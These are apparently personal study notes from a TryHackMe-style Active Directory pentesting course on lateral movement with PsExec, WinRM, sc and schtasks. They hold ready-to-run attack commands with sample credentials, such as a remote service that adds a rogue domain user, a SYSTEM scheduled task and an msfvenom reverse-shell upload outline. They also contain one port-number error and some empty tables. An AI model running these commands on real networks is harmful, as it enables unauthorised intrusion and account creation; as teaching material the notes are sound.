- Lateral movement 
	- Steps take after gaining initial access 
	- Techniques to move around network
	- Stealth - create few alerts

![[THM - AD Pentesting Phases.png]]

- Usually a cycle
	- After foothold, initial access is probably poor and cannot access other resources
	- Hence, do enumeration and internal recon to find vulnerabilities or misconfigurations to move laterally to other machines which may have more privileges
- Example
	- Say we got a foothold through phishing
	- The initial access account is probably low privileged because those who fall for phishing are non-technical users
	- Hence, need to internal recon to find vulns and other privileged hosts to pivot to and get assets value resources and assets
- Windows User Access Control
	- Runs applications under security context of non-administrator, even if ran by an Administrator
	- If needed, the application will prompt users "Run as Administrator"
- Note
	- **Local users** can not remotely connect to other machines
	- **Domain or users** can

## Lateral Movement Techniques
- Hackers use remote administrative protocols for lateral movement
	- Many different protocols
	- Each solve the same purpose, remote access
	- However, each have different execution methods and may have different fits for specific hacking scenarios

### SSH
- `ssh SG.APPLE.COM\admin01@PC001-SG.APPLE.COM`

### PsExec
![[THM - PsExec Pivoting.png]]

- Local accounts can not access remote machines unless they use admin credentials that can access that domain machine
- Required group membership
	- Administrators
- Uses SMB under the hood (Port 445/TCP), PsExec will:
	1. Uploads an executable on the `Admin$` share to facilitate the connection
		- `C:\Windows\psexesvc.exe` - PowerShell Exec Service
	2. Connect to the **Service Control Manager (SCM)** to run this executable under the service name `PSEXESVC` at `C:\Windows\psexesvc.exe`
		- Remote control of SCM is handled through **SVCCTL (Service Control)** - `svcctl.exe`
	4. Create named pipes to handle stdin, stdout, and stderr
- Windows
	- Installed from Microsoft website
	- https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
	- `psexec64.exe \\10.10.61.128 -u Administrator -p Password123 -i cmd.exe`
- Kali Linux
		- `impacket-psexec SG/Administrator:Password123@10.10.61.128`

### WinRM (Windows Remote Management)
- Uses HTTP or HTTPS under the hood but not at standard ports to avoid web server conflicts
	- 5958/TCP (WinRM HTTP)
	- 5986/TCP (WinRM HTTPS)
- Required group membership
	- Remote Management Users
- A lot of deployments will have WinRM enabled, good attack vector

- Command Prompt
	- `winrs -u:Administrator -p:Password123 -r:target cmd`
- PowerShell
```powershell
$username = 'Administrator';
$password = 'Mypass123';

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword);

# Interactive Session
Enter-PSSession -Computername TARGET -Credential $credential;

# Run command remotely in curly braces
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```
- Kali Linux
	- `evil-winrm`

### sc - Service Control commandlet
![[Pasted image 20230311085302.png]]

- **sc** communicates with a remote machine's SVCCTL process through rpc
	- 135/TCP, 59152-65535/TCP (DCE/RPC)
	- 139/TCP, 445/TCP (RPC over SMB, using SMB named pipes)
- Required Group Memberships
	- Administrators
- Original intention for sc is to run services, but hackers can use it to run arbitrary commands under a service (this service will run the command and "fail")
- sc uses two types of ports, as shown above, to try and communicate with a remote machine's SVCCTL
![[Pasted image 20230309023917.png]]

- Once connection is successful, can create service with a name and execute commands

```powershell
sc \\10.10.61.128 create FakeService binPath= "net user rogue Password123 /add /domain" start= auto

# Once the service starts, the command is executed
sc \\10.10.61.128 start FakeService

# To stop and delete the service
sc \\10.10.61.128 stop FakeService
sc \\10.10.61.128 delete FakeService
```

*Note*.  There won't be output because the service is run by the OS.

#### Reverse Shell
- Other than running commands, reverse shells can be uploaded

1. Reverse shell can be generated using [[msfvenom]] `exe-service` format
2. Upload through SMB with [[smbclient]]
	- To the `$ADMIN` share
	- `put msfvenom-shell.exe`
3. `runas` Administrator session
	- **sc** doesn't allow credentials but can use network terminal session

## schtasks
- Windows features called **Scheduled Tasks**
	- Use `schtasks` to remotely schedule tasks
- Similar to service control
	- Service control meant to run 24/7
	- Scheduled tasks meant to run periodically, think cron

```powershell
# /sc ONCE - we only need to run this command once instead of periodically
# /st and /sd - doesn't matter because we'll manually run it anyway
# /RU - run as "SYSTEM" user
schtasks /s 10.10.61.128 /RU "SYSTEM" /create /tn "FakeTask" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s 10.10.61.128 /run /TN "FakeTask" 

# Cleanup
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

*Note*.  There won't be output because the service is run by the OS.

| Protocol | Description |
| -------- | ----------- |
| PsExec   |             |
| WinRM    |             |
| sc.exe   |             |
| RDP      |             |
| VNC      |             |
| SSH      |             |

## Different Authentication Methods
- Can try different auth methods to pivot through

| Method  | Description |
| ------- | ----------- |
| LDAP    |             |
| WinRM   |             |
| RPC     |             |
| NetNTLM |             |

